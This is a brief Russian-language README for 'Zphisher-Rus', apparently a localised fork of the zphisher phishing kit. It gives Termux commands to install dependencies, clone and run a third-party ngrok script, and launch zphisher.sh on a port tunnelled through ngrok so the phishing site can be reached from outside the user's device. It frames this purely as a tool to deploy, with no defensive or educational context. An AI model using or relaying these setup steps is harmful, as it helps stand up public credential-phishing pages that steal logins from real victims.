# Zphisher-Rus
Для работы zphisher на Termux не обходимо установить зависимости!
apt update && apt upgrade && pkg update && pkg upgrade && apt install git curl php openssh -y
Если выдаст ошибку:
apt update && apt upgrade && pkg update && pkg upgrade && apt install git curl php openssh* -y
И всё! Но что бы сайт работал у  всех, а не только у вас, надо установить одну важную вешь.

git clone https://github.com/tchelospy/termux-ngrok.git
cd termux-ngrok
chmod +x termux-ngrok.sh
./termux-ngrok.sh
Далее открываем новую сессию 
cd Zphisher-Rus && bash zphisher.sh
В первой сессии где мы открыли ndrok, пишем тот же порт что и в zphisher.
Автор проекта he1pe1r!
Всем удачи!
